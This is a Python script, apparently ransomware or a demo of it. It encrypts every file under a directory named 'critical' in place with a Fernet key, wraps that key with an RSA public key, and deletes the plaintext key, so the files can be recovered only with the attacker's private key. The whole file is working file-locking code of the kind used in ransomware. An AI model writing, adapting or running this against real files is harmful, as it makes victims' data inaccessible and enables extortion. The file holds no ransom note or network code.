import os
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def create_secret_key():
    sec_key = Fernet.generate_key()
    with open("secret.key", "wb") as sec_key_file:
        sec_key_file.write(sec_key)
    print("Created the Secret key, saved as secret.key")
    return sec_key

def get_key():
    with open("secret.key", "rb") as sec_key_file:
        return sec_key_file.read()

def encrypt_fernet_key_with_rsa(fernet_key, rsa_pub_path="public.pem"):
    with open(rsa_pub_path, "rb") as sec_key_file:
        rsa_pub_key = RSA.import_key(sec_key_file.read())
    rsa = PKCS1_OAEP.new(rsa_pub_key)
    encr_key = rsa.encrypt(fernet_key)
    with open("secret.key.encrypted", "wb") as f:
        f.write(encr_key)
    os.remove("secret.key")

def lock_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted)
        print(f"Successfully encrypted the file: {file_path}")
    except Exception as e:
        print(f"Failed to encrypt the file: {file_path}: {e}")

def encrypt_dir(dir_path, key):
    for root, _, files in os.walk(dir_path):
        for f in files:
            f_path = os.path.join(root, f)
            lock_file(f_path, key)

if __name__ == "__main__":
    dir = "critical"

    if not os.path.exists("secret.key"):
        key = create_secret_key()
    else:
        key = get_key()
    print("Fetched key from secret.key now using it to lock the files")

    if os.path.exists(dir):
        print(f"Encrypting the folder: {dir}")
        encrypt_dir(dir, key)
        encrypt_fernet_key_with_rsa(key)
        print("\nSuccessfully encrypted the directory")
    else:
        print(f"Target directory '{dir}' does not exist.")
